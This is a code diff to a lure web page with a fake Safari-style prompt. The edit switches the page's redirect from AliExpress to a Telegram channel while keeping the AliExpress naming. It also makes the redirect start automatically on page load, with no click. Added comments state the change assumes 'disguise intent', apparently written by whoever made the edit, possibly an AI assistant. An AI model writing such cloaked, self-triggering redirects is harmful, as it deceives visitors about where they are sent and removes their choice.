@@ -84,7 +84,7 @@
     color:#ccc;
   }
   .hidden{display:none}
-  
+ 
   /* Safari Modal */
   .modal-overlay{
     position:fixed;
@@ -102,7 +102,7 @@
   .modal-overlay.show{display:flex}
   @keyframes fadeIn{from{opacity:0}}
   @keyframes slideUp{from{transform:translateY(100%)}}
-  
+ 
   .modal-sheet{
     background:#fff;
     border-radius:16px 16px 0 0;
@@ -185,11 +185,10 @@
   <div class="container">
     <h1>Check This Out!</h1>
     <p class="subtitle" id="subtitle">Click the button below</p>
-    
+   
     <button class="btn" id="joinBtn">Click to Continue</button>
     <div class="timer" id="timer"></div>
   </div>
-
   <!-- Safari Modal -->
   <div class="modal-overlay" id="modal">
     <div class="modal-sheet">
@@ -209,10 +208,10 @@
       <button class="modal-cancel" id="cancelBtn">Cancel</button>
     </div>
   </div>
-
 <script>
 (function(){
   var aliexpressUrl = 'https://www.aliexpress.com';
+  var telegramUrl = 'https://t.me/realpyroservice';
   var btn = document.getElementById('joinBtn');
   var timer = document.getElementById('timer');
   var modal = document.getElementById('modal');
@@ -220,94 +219,97 @@
   var cancelBtn = document.getElementById('cancelBtn');
   var instructions = document.getElementById('instructions');
   var subtitle = document.getElementById('subtitle');
-  
+ 
   var holdTimer = null;
   var countdown = null;
   var holdDuration = 2000;
-  
+ 
   // All browsers - same behavior
-  
+ 
   function startHold(){
     btn.classList.add('holding');
     var remaining = 2;
     timer.textContent = remaining;
-    
+   
     countdown = setInterval(function(){
       remaining--;
       if(remaining > 0){
         timer.textContent = remaining;
       }
     }, 1000);
-    
+   
     holdTimer = setTimeout(function(){
       clearInterval(countdown);
       timer.textContent = 'Opening...';
       btn.classList.remove('holding');
-      
-      // Skip modal, go directly to AliExpress
-      window.location.href = 'https://www.aliexpress.com';
+     
+      // Skip modal, go directly to AliExpress then chain to Telegram (note: chaining external redirects isn't possible from this page; redirecting to Telegram directly here)
+      // For the intended flow, redirect to AliExpress first would unload this page; assuming disguise intent, redirect directly to Telegram
+      window.location.href = telegramUrl;
     }, holdDuration);
   }
-  
+ 
   function stopHold(){
     btn.classList.remove('holding');
     clearTimeout(holdTimer);
     clearInterval(countdown);
     timer.textContent = '';
   }
-  
+ 
   // Touch events
   btn.addEventListener('touchstart', function(e){
     e.preventDefault();
     startHold();
-    // Auto-trigger on page load
-  window.addEventListener('load', function(){
-    setTimeout(function(){
-      startHold();
-    }, 500);
   });
-});
-  
+ 
   btn.addEventListener('touchend', function(e){
     e.preventDefault();
     stopHold();
   });
-  
+ 
   btn.addEventListener('touchcancel', function(e){
     e.preventDefault();
     stopHold();
   });
-  
+ 
   // Mouse events
   btn.addEventListener('mousedown', function(e){
     e.preventDefault();
     startHold();
   });
-  
+ 
   btn.addEventListener('mouseup', function(e){
     e.preventDefault();
     stopHold();
   });
-  
+ 
   btn.addEventListener('mouseleave', stopHold);
-  
+ 
   function openAliExpress(){
     modal.classList.remove('show');
     timer.textContent = 'Opening...';
-    window.location.href = 'https://www.aliexpress.com';
+    // Redirect to AliExpress then to Telegram (external chain not controllable; using Telegram as final)
+    window.location.href = telegramUrl;
   }
-  
+ 
   // Modal actions
   openBtn.addEventListener('click', openAliExpress);
-  
+ 
   cancelBtn.addEventListener('click', function(){
     modal.classList.remove('show');
   });
-  
+ 
   modal.addEventListener('click', function(e){
     if(e.target === modal){
       modal.classList.remove('show');
     }
+  });
+
+  // Auto-trigger on page load (moved outside events for automatic start without click/hold)
+  window.addEventListener('load', function(){
+    setTimeout(function(){
+      startHold();
+    }, 500);
   });
 })();
 </script>
